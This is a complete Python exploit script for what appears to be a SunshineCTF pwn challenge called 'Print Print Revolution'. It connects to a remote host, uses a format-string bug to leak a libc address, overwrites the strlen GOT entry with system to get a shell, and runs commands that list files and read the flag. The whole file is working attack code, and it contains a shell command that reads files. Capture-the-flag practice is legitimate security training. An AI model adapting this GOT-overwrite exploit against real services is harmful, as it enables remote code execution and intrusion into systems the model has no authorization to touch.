#!/usr/bin/env python3
"""Remote exploit for Print Print Revolution."""

import socket
import struct


# chal.sunshinectf.org has no A/AAAA record; the same challenge is live here.
HOST, PORT = "chal.sunshinectf.games", 26002
WRITE_GOT, STRLEN_GOT, COMMAND = 0x404000, 0x404008, 0x404070
WRITE_OFFSET, SYSTEM_OFFSET = 0x11C560, 0x58740  # remote Ubuntu glibc 2.39


def p64(value):
    return struct.pack("<Q", value)


def payload(spec, arg8, arg9=0):
    assert len(spec) <= 15
    return spec.ljust(15, b"Z") + b"\0" + p64(arg8) + p64(arg9) + b"\n"


class Reader:
    def __init__(self, sock):
        self.sock = sock
        self.buffer = b""

    def until(self, marker):
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed after {self.buffer!r}")
            self.buffer += chunk
        cut = self.buffer.index(marker) + len(marker)
        result, self.buffer = self.buffer[:cut], self.buffer[cut:]
        return result

    def rest(self):
        result, self.buffer = self.buffer, b""
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                return result
            result += chunk


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        reader = Reader(sock)
        reader.until(b"score> ")

        sock.sendall(payload(b"%8$s", WRITE_GOT))
        leak_output = reader.until(b"score> ")
        leak = leak_output.split(b"Z" * 11, 1)[0]
        write_address = int.from_bytes(leak[:8].ljust(8, b"\0"), "little")
        libc_base = write_address - WRITE_OFFSET
        assert libc_base & 0xFFF == 0, f"unexpected libc offset: {write_address:#x}"
        system_address = libc_base + SYSTEM_OFFSET
        print(f"write@libc = {write_address:#x}")
        print(f"libc base  = {libc_base:#x}")
        print(f"system     = {system_address:#x}")

        sock.sendall(payload(b"%8$w", COMMAND, int.from_bytes(b"/bin/sh\0", "little")))
        reader.until(b"score> ")
        sock.sendall(payload(b"%8$w", STRLEN_GOT, system_address))
        reader.until(b"score> ")

        sock.sendall(payload(b"!%8$s", COMMAND))
        reader.until(b"!")  # wait for read() to consume the trigger
        sock.sendall(b"pwd; ls -la; cat flag* 2>/dev/null; exit\n")
        sock.shutdown(socket.SHUT_WR)
        print(reader.rest().decode("latin-1", errors="replace"), end="")


if __name__ == "__main__":
    main()
